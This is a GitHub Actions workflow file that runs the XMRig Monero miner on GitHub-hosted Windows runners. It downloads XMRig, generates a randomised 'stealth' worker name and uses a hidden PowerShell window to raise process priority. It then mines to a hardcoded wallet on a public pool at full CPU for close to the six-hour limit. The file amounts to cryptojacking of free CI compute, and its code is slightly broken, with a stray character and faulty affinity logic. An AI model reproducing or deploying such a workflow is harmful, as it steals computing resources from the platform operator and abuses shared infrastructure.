name: üöÄ High-Performance Windows XMRig Miner

on:
  workflow_dispatch:

jobs:
  ultra_mine:
    runs-on: windows-latest
    timeout-minutes: 355  # Max allowed runtime
    steps:
      - name: üé≤ Generate stealth worker name
        id: worker
        run: echo "name=win-$(Get-Random -Minimum 10000 -Maximum 99999)-$(Get-Date -Format 'HHmmss')" | Out-File -FilePath $env:GITHUB_OUTPUT -Append

      - name: ‚ö° Download tuned XMRig (AVX2 optimized)
        run: |
          mkdir -p $env:USERPROFILE\miner
          cd $env:USERPROFILE\miner
          Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip" -OutFile "xmrig.zip"
          Expand-Archive -Path "xmrig.zip" -DestinationPath .
          Rename-Item -Path "xmrig-6.21.0" -NewName "xmrig"

      - name: üõ†Ô∏è Performance Tweaks
        run: |
          # Set high priority and CPU affinity
          Start-Process powershell -ArgumentList "\
            $pid = (Get-Process -Name xmrig).Id; \
            wmic process where ProcessId=$pid CALL setpriority 'high priority'; \
            $cores = (0..(Get-WmiObject Win32_Processor).NumberOfLogicalProcessors-1); \
            $affinity = [string]::Join(',', ($cores | Select-Object -Skip 1)); \
            $process = Get-Process -Id $pid; \
            $process.ProcessorAffinity = [convert]::ToInt32($affinity.Replace(',',''),2)" \
          -WindowStyle Hidden

      - name: üí• Run XMRig (Max Tuned)
        run: |
          cd $env:USERPROFILE\miner\xmrig
          Start-Process -NoNewWindow -FilePath ".\xmrig.exe" -ArgumentList @(
            "-o pool.supportxmr.com:3333",
            "-u 85jUiJ7tUsZ1gCRTVy4RyoQwPypRBQf1CaZvhogatc1hYHeecdqcq4uUAWntQyUdRhZRB72n1Vt792JvPcstTcntR2g9eZS",
            "-p ${{ steps.worker.outputs.name }}",
            "--randomx-init=1",
            "--randomx-mode=fast",
            "--cpu-max-threads-hint=100",
            "--cpu-priority=5",
            "--argon2-impl=AVX2",
            "--asm=auto",
            "--donate-level=1",
            "--no-color"
          )s
